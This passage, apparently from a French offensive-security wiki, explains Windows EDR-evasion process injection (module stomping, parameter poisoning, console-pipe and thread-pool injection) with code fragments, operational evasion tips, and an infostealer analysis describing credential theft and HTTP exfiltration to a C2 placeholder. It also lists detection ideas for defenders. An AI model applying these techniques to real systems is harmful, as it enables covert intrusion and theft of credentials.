Le stomping naïf de modules courants comme `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite peut faire planter le processus. Une procédure plus fiable consiste à :

1. Énumérer les modules du processus cible et ne conserver qu’une **liste d’inclusion contenant uniquement les noms** des DLL déjà chargées.
2. Construire d’abord le payload et noter sa **taille exacte en octets**.
3. Parcourir les DLL candidates sur le disque et comparer le **`Misc_VirtualSize` de la section PE `.text`** à la taille du payload. Ce critère importe davantage que la taille du fichier, car il reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Analyser l’**Export Address Table (EAT)** et choisir le RVA d’une fonction exportée comme décalage de départ du stomp.
5. Calculer le **rayon d’impact** : si le payload dépasse les limites de la fonction choisie, il écrasera les exports adjacents situés après elle en mémoire.

Exemples d’outils de reconnaissance/sélection observés sur le terrain :

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Préférez les DLL **déjà chargées** dans le processus distant afin d’éviter la télémétrie de `LoadLibrary` et des chargements d’images inattendus.
- Préférez les exports rarement exécutés par l’application cible ; sinon, des chemins de code normaux peuvent atteindre les octets écrasés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode sous forme de chaîne littérale par un **initialiseur de tableau d’octets/entre accolades**, afin que le tampon complet soit correctement représenté dans le code source de l’injecteur.

Detection ideas
- Écritures distantes dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`), plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’export dont les octets en mémoire ne correspondent plus au fichier de référence sur le disque.
- Threads distants ou pivots de contexte qui commencent leur exécution dans un export de DLL légitime dont les premiers octets ont été modifiés récemment.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` visant des pages `.text` de DLL et suivies de la création d’un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) est une technique d’**injection de processus / d’évasion d’EDR** qui évite le chemin classique d’écriture distante (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Les carriers utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des carriers :

- `lpCommandLine` doit pointer vers une **mémoire inscriptible** pour `CreateProcessW` et est limité à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NAME=VALUE\0`, suivies d’un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mapping vers `ShellInfo` doit donc être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

La création normale d’un processus devient ainsi la **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie interprocessus.

### Remote lookup flow without remote write APIs

Une fois l’enfant créé, résolvez l’adresse du tampon copié à l’aide de primitives en **lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → récupérer `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flux minimal :

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Exécuter le buffer de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante consiste à :

1. Créer le processus normalement (pas en état suspendu)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà renvoyé dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de thread hijacking, cela ne **nécessite pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement à l’aide du handle du thread principal renvoyé.

Cela évite plusieurs API couramment surveillées pour l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation des octets nuls et shellcode en plusieurs étapes

Les trois vecteurs sont des **données de type chaîne**, donc une payload brute contenant `0x00` est tronquée pendant le transfert. Une solution pratique consiste à utiliser un **premier stage sans octets nuls**, qui reconstruit les constantes à l’exécution, puis charge un second stage arbitraire.

Un schéma simple consiste à synthétiser les constantes avec XOR :

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This permet à la première étape de construire des chaînes sur la pile, des arguments d’API, des chemins de DLL ou un chargeur de shellcode de seconde étape sans intégrer d’octets nuls au paramètre transmis.

### Appels d’API basés sur la pile depuis la première étape

Lorsque la première étape doit appeler des API telles que `LoadLibraryA`, elle peut :

- empiler la chaîne/le tampon sur la pile de la cible
- réserver les **32 octets de shadow space x64**
- définir `RCX`, `RDX`, `R8`, `R9` avec des constantes ou des pointeurs relatifs à `RSP`
- maintenir `RSP` **aligné sur 16 octets** avant l’appel

Une seconde étape peut ensuite être copiée depuis la pile dans une allocation `PAGE_READWRITE`, passée en `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée par saut, évitant ainsi une allocation RWX directe.

### Idées de détection

Pistes de détection intéressantes mentionnées par les auteurs :

- `VirtualProtectEx` / `NtProtectVirtualMemory` qui rendent exécutables des **pages de paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures à distance du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs de `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved anormalement longues ou à forte entropie lors de la création d’un processus

### Remarques

- P3 est une **technique de transfert interprocessus**, et non une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement de permission d’exécution et une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté parce qu’il fait appel en interne à des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Injection par pipe STDIN de console

Un processus enfant de console interactif peut également servir de **primitive de transfert de payload**. L’injecteur redirige l’entrée standard de l’enfant vers un pipe et envoie un marqueur suivi de shellcode. Une fois que le programme de console a lu les données dans sa mémoire privée, l’injecteur localise ce tampon, le rend exécutable et redirige un thread enfant vers celui-ci. Cette méthode évite `VirtualAllocEx` et `WriteProcessMemory`, mais reste une injection de processus et non un contournement générique d’EDR.<sup>[[41]](#references)</sup>

Malgré la description « named-pipe », l’implémentation de référence appelle `CreatePipe`, qui crée un **pipe anonyme**. Windows implémente les pipes anonymes à l’aide d’objets pipe nommés de façon unique en interne, mais le PoC ne choisit pas de chemin `\\.\pipe\<name>` et n’appelle pas `CreateNamedPipe`. Il crée des handles héritables avec un descripteur de sécurité par défaut, place le handle de lecture dans `STARTUPINFO.hStdInput`, définit `STARTF_USESTDHANDLES` et lance un nouvel enfant avec l’héritage des handles activé. Par conséquent, ce PoC lance l’exécutable de console fourni ; il ne rattache pas son pipe à un processus existant.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Déroulement de référence

L’implémentation utilise la chaîne suivante :<sup>[[41]](#references)</sup>

1. Créer des paires de pipes anonymes pour `STDIN` et `STDOUT` de l’enfant. Désactiver l’héritage sur les deux handles côté parent et fermer les doublons côté enfant dans le parent après la création du processus.
2. Lancer un exécutable interactif tel que `netsh.exe` ou `nslookup.exe` avec `CREATE_NEW_CONSOLE`. L’enfant hérite des handles standard redirigés.
3. Envoyer le tableau binaire `rawData` complet avec `WriteFile` via le handle `STDIN` côté parent. Le programme de console consomme les octets et en laisse une copie dans l’une de ses régions privées validées.
4. Parcourir l’espace d’adressage de l’enfant avec `VirtualQueryEx`, lire les régions candidates `MEM_PRIVATE` avec `ReadProcessMemory` et rechercher le marqueur au début de `rawData`.
5. Modifier la protection du tampon découvert en `PAGE_EXECUTE_READWRITE` avec `VirtualProtectEx`.
6. Identifier le thread principal, le suspendre, définir `RIP` sur `found_address + 0x19` avec `NtSetContextThread`, puis le reprendre.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L’implémentation fournie est spécifique à x64 : elle modifie `CONTEXT.Rip`, et sa charge utile intégrée est du shellcode x64. `rawData` commence par un marqueur de 25 octets ; les octets exécutables commencent donc à l’offset hexadécimal `0x19`. Lors du remplacement de la charge utile, préservez cette disposition ou mettez à jour ensemble le marqueur, le vecteur de recherche, la taille du tableau et l’offset d’exécution. Les commentaires du code source indiquent également que `0x0A`, `0x0D` et `0x1A` sont des caractères interdits. Ce workflow ne modifie ni le token ni les privilèges du processus enfant.<sup>[[41]](#references)</sup>

Pour des helpers natifs légers et des modèles de compilation de payloads, consultez [Payloads C Windows](windows-local-privilege-escalation/windows-c-payloads.md).

## Injection de DLL via callback de thread pool sans shellcode (DLLParty)

DLLParty adapte l’injection de thread pool de type PoolParty pour qu’un worker existant de la cible appelle `LoadLibraryA`, au lieu d’exécuter un stub de callback injecté. Sa primitive de dispatch est un achèvement `TP_DIRECT` mis en file d’attente sur le port d’achèvement d’E/S du pool cible. Cela ne contourne pas les permissions du processus : le PoC appelle `OpenProcess(PROCESS_ALL_ACCESS)` et nécessite une mémoire cible lisible et modifiable, ainsi que des handles de worker-factory et de port d’achèvement duplicables.<sup>[[46]](#references)[[47]](#references)</sup>

Sous Windows x64, le worker transmet un pointeur vers un `TP_CALLBACK_INSTANCE` alloué sur sa pile dans `RCX`, le premier argument du callback. `LoadLibraryA` interprète ce même pointeur comme un `LPCSTR`. Dans le chemin testé, `TppWorkerThread` construit le pointeur à `RSP+0x178`, tandis que sa première écriture ordinaire dans cet objet se fait à `RSP+0x1d0`. Un chemin de DLL terminé par un caractère nul et tenant dans ce préfixe de 0x58 octets peut donc être placé au début de l’instance sans être écrasé avant le dispatch. Il s’agit d’une observation spécifique à cette build, et non d’une garantie documentée de l’ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Le workflow de référence est le suivant :<sup>[[46]](#references)[[47]](#references)</sup>

1. Énumérez les handles de la cible avec `NtQuerySystemInformation(SystemHandleInformation)` et identifiez `TpWorkerFactory` en interrogeant les types d’objets. Dupliquez un handle de worker-factory et interrogez `WorkerFactoryBasicInformation` ; `StartParameter` fournit le `TP_POOL` distant. Ignorez les factories pour lesquelles `TotalWorkerCount == 0`.
2. Lisez `TP_POOL.CompletionPort` et parcourez la liste privée des workers du pool. Sur la build x64 testée de Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), sa tête se trouve à `pool+0x60` ; chaque lien se trouve à `worker+0x10`, donc l’emplacement de l’instance de callback à `worker+0x38` est égal à `link+0x28`. Le PoC vérifie l’alignement des pointeurs, la réciprocité des liens, l’appartenance au pool, les identifiants de thread non nuls, les nœuds répétés et la stabilité de la tête de liste.
3. Écrivez le chemin de la DLL dans **chaque** emplacement de worker récupéré, car le worker qui consommera l’achèvement mis en file d’attente peut être n’importe lequel. Placez un `TP_DIRECT` avec `Callback = LoadLibraryA` dans la mémoire cible modifiable. Le PoC utilise `last_slot-0x500` sur une pile de worker au lieu de `VirtualAllocEx` ; cet offset est expérimental et ne doit pas chevaucher des données de pile actives.
4. Dupliquez le handle du port d’achèvement de la cible et appelez `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. L’adresse du `TP_DIRECT` distant est la clé d’achèvement. Un worker existant appelle alors `LoadLibraryA` avec le pointeur d’instance de callback écrasé, chargeant une DLL déjà accessible à la cible.

Le PoC prend un PID cible (`DLLParty.exe <target_pid>`) et utilise un chemin de DLL codé en dur dans `DLLParty.cpp` ; définissez un chemin accessible à la cible avant de compiler un exécutable x64. Il utilise également l’adresse de `LoadLibraryA` de son propre processus comme callback distant, et suppose donc que cette adresse est valide dans la cible. Le code ne vérifie ni que la longueur du chemin tient dans le préfixe de 0x58 octets, ni que le parcours des workers a trouvé un emplacement avant d’indexer le dernier élément. Revalidez les offsets privés, la disposition de la pile et l’espace modifiable pour la build cible. L’absence de `CreateRemoteThreadEx`, de shellcode et de `VirtualAllocEx` n’élimine ni les écritures interprocessus ni la télémétrie de chargement de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Techniques de SantaStealer pour l’évasion sans fichier et le vol d’identifiants

SantaStealer (également appelé BluelineStealer) montre comment les voleurs d’informations modernes combinent le contournement de l’AV, l’anti-analyse et l’accès aux identifiants dans un même workflow.<sup>[[24]](#references)</sup>

### Filtrage selon la disposition du clavier et délai en sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est détectée, l’échantillon dépose un marqueur `CIS` vide et se termine avant l’exécution des stealers, ce qui lui permet de ne jamais se déclencher dans les régions exclues tout en laissant une trace utile à la détection.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logique `check_antivm` à plusieurs couches

- La variante A parcourt la liste des processus, calcule un checksum roulant personnalisé pour chaque nom et le compare à des blocklists intégrées de debuggers/sandboxes ; elle recalcule le checksum du nom de l’ordinateur et vérifie des répertoires de travail comme `C:\analysis`.
- La variante B inspecte les propriétés du système (seuil minimal pour le nombre de processus, durée de fonctionnement récente), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des vérifications temporelles autour des pauses pour repérer le single-stepping. À la moindre détection, l’exécution s’interrompt avant le lancement des modules.

### Helper fileless et chargement réflexif avec double ChaCha20

- La DLL/EXE principale intègre un helper Chromium de récupération d’identifiants, qui est soit écrit sur le disque, soit mappé manuellement en mémoire ; en mode fileless, il résout lui-même les imports/relocations, sans laisser d’artefacts du helper.
- Ce helper stocke une DLL de deuxième étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets et deux nonces de 12 octets). Après les deux opérations, il charge le blob de manière réflexive (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines ChromElevator utilisent le process hollowing réflexif par direct-syscall pour injecter du code dans un navigateur Chromium actif, hériter des clés AppBound Encryption et déchiffrer directement les mots de passe/cookies/cartes de crédit depuis les bases de données SQLite, malgré le renforcement d’ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par segments

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit ses résultats dans des buffers partagés et indique le nombre de fichiers après une période d’attente de ~45 s pour le join.
- Une fois la collecte terminée, tout est compressé avec la bibliothèque `miniz` liée statiquement sous `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s et transmet l’archive par segments de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, en usurpant une boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque segment ajoute `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` si nécessaire, et le dernier segment ajoute `complete: true` pour signaler au C2 que le réassemblage est terminé.

## References

- [1] [Techniques avancées d’évasion : précision du module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Les call stacks : fini les passes gratuites pour les malwares](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemple](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemple](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC de falsification de call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nouvelle chaîne d’infection et obfuscation basée sur ConfuserEx pour le stealer DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Faut-il faire confiance à votre zero trust ? Contourner les vérifications de posture de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Avant ToolShell : exploration des opérations de ransomware précédentes de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading : abus des exports transférés](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventaire des exports transférés de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordre de recherche des bibliothèques de liens dynamiques](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sécurité des processus et droits d’accès](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Référence EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanceur CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrer les EDR avec la protection Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Briser la protection de Windows Defender avec la technique de redirection de dossier](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Référence de la commande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sous le rideau pur : du RAT au builder puis au codeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arrive en ville : un nouveau stealer ambitieux](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Déchiffrement de Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader : déjouer les malwares Node.js grâce au traçage des API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Belle au bois dormant : mettre Adaptix au repos avec Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Empoisonnement des paramètres de processus](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Belle au bois dormant II : CFG, CET et falsification de stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation des pauses avec Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Masquer votre ETW .NET](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Abuser de Chrome Remote Desktop dans les opérations Red Team : guide pratique](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged : transformer le pilote de remédiation de Defender en primitive d’opération noyau](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Code compagnon Function Peekaboo de MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo : créer des fonctions auto-masquantes avec LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Source InjectSetConsole de TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Fonction CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Création d’un processus enfant avec redirection des entrées et sorties](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy : reforger des outils C# avec WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – Compiler des projets C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty : preuve de concept et code source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abuser des mécanismes internes du thread pool pour l’injection de DLL sans shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
